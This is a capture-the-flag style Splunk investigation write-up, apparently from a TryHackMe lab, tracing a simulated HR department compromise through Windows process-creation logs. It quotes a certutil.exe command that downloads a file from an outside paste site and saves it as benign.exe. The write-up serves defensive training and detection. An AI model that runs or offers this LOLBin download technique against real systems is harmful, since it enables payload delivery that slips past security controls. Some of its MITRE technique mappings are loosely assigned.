**Splunk Investigation: HR Department Compromise (Event ID 4688\)**

---

### **Summary**

An IDS flagged suspicious process execution within the HR department. Using Windows Event ID 4688 logs ingested into Splunk, we conducted an investigation to identify signs of malicious activity and potential compromise.

---

### **Key Findings**

* **Impersonation Account:** Detected a typo-squatted account, Amel1a, spoofing legitimate marketing user Amelia.  
* **Suspicious User Activity:** Chris.fort (HR) executed processes such as taskkill.exe and clip.exe, not typical for end-users.  
* **LOLBin Abuse:** Haroon used certutil.exe to download a file from controlc.com, indicating Living-off-the-Land Binary (LOLBin) abuse.  
* **MITRE ATT\&CK Mapping:** Attacker used credential impersonation (T1078.004), LOLBins (T1218.010), and C2 (T1105)

---

### **Investigation Steps**

#### **1\. Baselining Logs**

* **Query:**  
  index=win\_eventlogs | stats count  
  → Returned **13,959 logs** (March 2022 only).  
* **Scoped HR User Activity:**  
  index=win\_eventlogs Username IN ("chris.fort", "haroon", "diana")  
  → Focussed on users from the HR department.

#### **2\. Identifying the Imposter Account**

* **Query:**  
  index=\* | stats count by Username  
  → Identified Amel1a, a spoofed version of Amelia. Typo-squatting confirmed.

**Efficiency Note:** stats count is preferred over table | dedup for better performance in large datasets.

#### **3\. Triaging HR User Activity**

##### **Chris.fort:**

* **Query:**  
  Username="Chris.fort" | table ProcessName, CommandLine | dedup ProcessName  
* Ran suspicious binaries:  
  * taskkill.exe, clip.exe (scripting and automation tools)   
  * backgroundTaskHost.exe (also used by Diana, but Chris had no productivity apps)  
* Lacked normal user behavior (e.g., browser, Office apps).  
* *Attempted Detection of Scheduled Task Binaries:*  
  * ProcessName IN ("schtasks.exe", "svchost.exe", "taskeng.exe")  
* No strong indicators here, pivoted back to broader process review.

##### **Diana:**

* While both Chris and Diana executed backgroundTaskHost.exe, only Diana ran typical productivity apps like chrome.exe and notepad.exe.  
* No red flags.

##### **Haroon:**

* Executed:  
  certutil.exe \-urlcache \-split \-f https://controlc.com/e4d11035 benign.exe  
  * Indicates malicious file download via **certutil.exe** (LOLBAS technique).  
  * While Certutil is a legitimate Windows tool, its use here \- along with haroon’s lack of other admin level activity \- strongly suggests its use is malicious.

#### **4\. Confirming Malicious Activity**

* File saved: benign.exe  
* Downloaded from: https://controlc.com/e4d11035  
* Flag found inside file: THM{KJ&\*H^B0}

**IOC Summary:** The download from controlc.com and presence of encoded payloads are consistent with command-and-control behavior observed during post-exploitation phases. 

---

### **Lessons Learned**

#### **SOC Workflow**

* **Alerting Strategy:** Flag unusual process execution, especially known LOLBins like certutil.exe, particularly when run by non-admin users.  
* **Baseline Behavior:** Department-level activity baselining can reduce false positives.

#### **Tool Efficiency**

* stats count is more performant than table | dedup for retrieving unique values.  
* dedup remains useful in small-scope investigations, such as filtering usernames.

---

### **MITRE ATT\&CK Mappings**

  | Tactic               | Technique  | Description                                |
|:---------------------|:-----------|:-------------------------------------------|
| Execution            | T1059.003  | certutil.exe used to download a payload    |
| Persistence          | T1078.004  | Spoofed account Amel1a for access           |
| Defense Evasion      | T1218.010  | LOLBin abuse with certutil.exe              |
| Command and Control  | T1105       | Connection to external C2 (controlc[.]com)  |


---

This investigation highlights a multi-phase attack starting with credential abuse, followed by LOLBin execution and external communication. Each phase was observable via effective Splunk queries and contextual log analysis.
